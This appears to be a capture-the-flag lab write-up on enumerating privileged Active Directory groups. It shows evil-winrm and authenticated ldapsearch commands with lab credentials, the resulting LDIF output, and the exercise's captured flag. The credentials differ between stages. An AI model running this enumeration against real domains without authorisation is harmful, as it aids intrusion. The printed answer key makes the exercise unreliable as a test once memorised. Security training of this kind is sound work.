2. Group Metadata Inspection: Uncovering Hidden Data in Active Directory Group Attributes
Objective

Active Directory groups store more than just member lists. Non-standard or operational attributes can contain legacy notes, administrative descriptions, or sensitive flags that remain invisible during default directory queries. Your goal is to map the target domain's privileged groups and extract hidden data using remote enumeration techniques.
Your Mission

    Enumerate security groups in the target domain from an external attack platform.

    Inspect extended and operational attributes of high-value groups.

    Identify the specific group containing the hidden flag within its metadata.

    [!TIP]
    Hint: The target is a well-known privileged group. Default enumeration tools and basic queries will omit this data; you must explicitly request both user (*) and operational (+) properties during the LDAP bind.

Repository Details

    GitHub Repository: holbertonschool-cyber_security

    Directory: Active_directory/0x01-AD_Basics_And_Concepts

    File: 2-flag.txt

Stage 1: The WinRM Interactive Shell Failure
The Concept: Target Architecture Restrictions

When executing post-exploitation steps, operators often default to interactive command shells via protocols like WinRM (evil-winrm). However, Active Directory environments enforce strict access controls on core infrastructure. By default, standard domain accounts or workstation local accounts are blocked from spawning interactive management sessions directly on a Domain Controller.
Execution Input (Kali Linux Host)
Bash

evil-winrm -i 192.168.56.20 -u labuser -p 'Password123!'

Terminal Output
Plaintext

Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> net.exe group /domain

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1

Technical Explanation of the Failure

The initial connection handshake succeeded because the WSMAN service was listening on port 5985. However, the moment an active command thread was sent, the Domain Controller evaluated the token permissions for labuser.

Because the account lacked explicit authorization to log in interactively to the Domain Controller architecture, the system abruptly terminated the remote execution thread (wsmprovhost.exe). This resulted in a WinRMAuthorizationError and broke the terminal session.
Stage 2: The Pentester Pivot — Moving Down the Protocol Stack
The Concept: Authenticated LDAP Enumeration

When higher-level interactive management protocols (RDP, WinRM) reject a connection, a pentester must pivot down the stack to look for foundational services. An nmap scan of the target host (192.168.56.20) confirmed that port 389 (LDAP) is fully exposed.
Plaintext

PORT    STATE SERVICE
389/tcp open  ldap

Active Directory requires a valid account to query the directory tree, but it does not require that account to have interactive login privileges. By switching from an active shell to direct, lower-level LDAP queries, we can pull data from the directory without triggering interactive authentication blocks.
Stage 3: Troubleshooting OpenLDAP Client Options
The Concept: Standard URI Target Definitions

Modern implementations of the OpenLDAP client kit (ldapsearch) on Kali Linux have deprecated the traditional legacy command switches for specifying host addresses.
Execution Input (Incorrect Syntax)
Bash

ldapsearch -h 192.168.56.20 -x -b "DC=PENTESTLAB,DC=local" "(objectCategory=group)"

Terminal Output
Plaintext

ldapsearch: invalid option -- 'h'
ldapsearch: unrecognized option -h
usage: ldapsearch [options] [filter [attributes...]]

Technical Explanation of the Failure

The legacy -h flag is no longer supported by current OpenLDAP packages. When omitted, the tool misinterprets the raw target IP address as part of the query filter structure, breaking the execution loop.
The Correction

To interact with modern LDAP engines, you must pass a fully qualified LDAP Uniform Resource Identifier (URI) using the -H parameter followed by the protocol scheme (ldap:// or ldaps://).
Stage 4: Crafting the Extended Attribute Query

To complete the mission, we must log into the LDAP directory using verified domain credentials (P@ssw0rd123!) and specifically request standard user attributes (*) along with constructed/operational attributes (+). This ensures hidden administrative notes are pulled into the local buffer.
Execution Input (Kali Linux Host)
Bash

ldapsearch -H ldap://192.168.56.20 -x -D "CN=labuser,CN=Users,DC=PENTESTLAB,DC=local" -w 'P@ssw0rd123!' -b "DC=PENTESTLAB,DC=local" "(&(objectCategory=group)(|(cn=Domain Admins)(cn=Enterprise Admins)(cn=Backup Operators)))" "*" "+"

Script Switch Breakdown

    -H ldap://192.168.56.20: Connects to the directory server endpoint using the modern URI format.

    -x: Enforces Simple Authentication instead of complex SASL negotiations.

    -D "CN=labuser...": Specifies the Bind DN (the explicit identity string used to log into the directory).

    -w 'P@ssw0rd123!': Passes the plain-text password argument cleanly to the authentication mechanism.

    -b "DC=PENTESTLAB,DC=local": Defines the base distinguished name where the search scope begins inside the tree.

    "(&(objectCategory=group)(|(cn=Domain Admins)...))": An advanced LDAP search filter that reads: "Find entries matching object category group AND match common names of Domain Admins, Enterprise Admins, OR Backup Operators."

    "*" "+": Instructs the domain controller to output all standard properties (*) alongside all operational properties (+).

Stage 5: Data Analysis & Flag Retrieval
Terminal Raw Log Output
Plaintext

# extended LDIF
#
# LDAPv3
# base <DC=PENTESTLAB,DC=local> with scope subtree
# filter: (&(objectCategory=group)(|(cn=Domain Admins)(cn=Enterprise Admins)(cn=Backup Operators)))
# requesting: * + 
#

# Domain Admins, Users, PENTESTLAB.local
dn: CN=Domain Admins,CN=Users,DC=PENTESTLAB,DC=local
objectClass: top
objectClass: group
cn: Domain Admins
member: CN=labuser,CN=Users,DC=PENTESTLAB,DC=local
member: CN=App-Admins,CN=Users,DC=PENTESTLAB,DC=local
member: CN=IT_Admins,DC=PENTESTLAB,DC=local
member: CN=Alice Martin,OU=Lab_Users,DC=PENTESTLAB,DC=local
member: CN=Admin Temp,OU=IT-Users,OU=IT,OU=PENTESTLAB-CORP,DC=PENTESTLAB,DC=lo
 cal
member: CN=Backup Service,OU=IT-ServiceAccounts,OU=IT,OU=PENTESTLAB-CORP,DC=PE
 NTESTLAB,DC=local
member: CN=IT-Admins,OU=IT-Groups,OU=IT,OU=PENTESTLAB-CORP,DC=PENTESTLAB,DC=lo
 cal
member: CN=Sarah Support,OU=IT-Users,OU=IT,OU=PENTESTLAB-CORP,DC=PENTESTLAB,DC
 =local
member: CN=John Admin,OU=IT,OU=PENTESTLAB-CORP,DC=PENTESTLAB,DC=local
member: CN=Administrator,CN=Users,DC=PENTESTLAB,DC=local
distinguishedName: CN=Domain Admins,CN=Users,DC=PENTESTLAB,DC=local
instanceType: 4
whenCreated: 20260129193813.0Z
whenChanged: 20260513144532.0Z
uSNCreated: 12345
info: FLAG2{5b71afb34d4d0173498aa18c78cece76b07c58b05c8cbd54252050cf7421}
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=PENTESTLAB,DC=
 local
memberOf: CN=Administrators,CN=Builtin,DC=PENTESTLAB,DC=local
uSNChanged: 336026
name: Domain Admins
objectGUID:: tn52NowQG0WjYg4KNFW9jA==
objectSid:: AQUAAAAAAAUVAAAAL37AEBX3FkP6RvrGAAIAAA==
adminCount: 1
sAMAccountName: Domain Admins
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=PENTESTLAB,DC=local
isCriticalSystemObject: TRUE

# Backup Operators, Builtin, PENTESTLAB.local
dn: CN=Backup Operators,CN=Builtin,DC=PENTESTLAB,DC=local
objectClass: top
objectClass: group
cn: Backup Operators
description: Backup Operators can override security restrictions for the sole 
 purpose of backing up or restoring files
sAMAccountName: Backup Operators
sAMAccountType: 536870912

# Enterprise Admins, Users, PENTESTLAB.local
dn: CN=Enterprise Admins,CN=Users,DC=PENTESTLAB,DC=local
objectClass: top
objectClass: group
cn: Enterprise Admins
description: Designated administrators of the enterprise
sAMAccountName: Enterprise Admins
sAMAccountType: 268435456

# search result
search: 2
result: 0 Success

Security Post-Mortem & Vulnerability Mapping

Analyzing the LDIF properties indicates standard parameters for both Backup Operators and Enterprise Admins. However, the Domain Admins object reveals a serious metadata information leak:
Plaintext

info: FLAG2{5b71afb34d4d0173498aa18c78cece76b07c58b05c8cbd54252050cf7421}

    The Flaw: The info attribute is a multi-line text field intended for notes or comment strings. Network administrators often store temporary configuration logs, service credentials, or scripting values here, operating under the assumption that these values are obscure or hidden since they do not populate within standard graphical interface windows (like standard Active Directory Users and Computers snap-ins).

    The Pentesting Lesson: Because Active Directory allows all authenticated users within the domain (Domain Users) to read the descriptive attributes of core container groups by default, storing any confidential data within these secondary fields exposes it directly to low-privilege internal attackers.

    [!KEY]
    Captured Target Flag: FLAG2{5b71afb34d4d0173498aa18c78cece76b07c58b05c8cbd54252050cf7421}
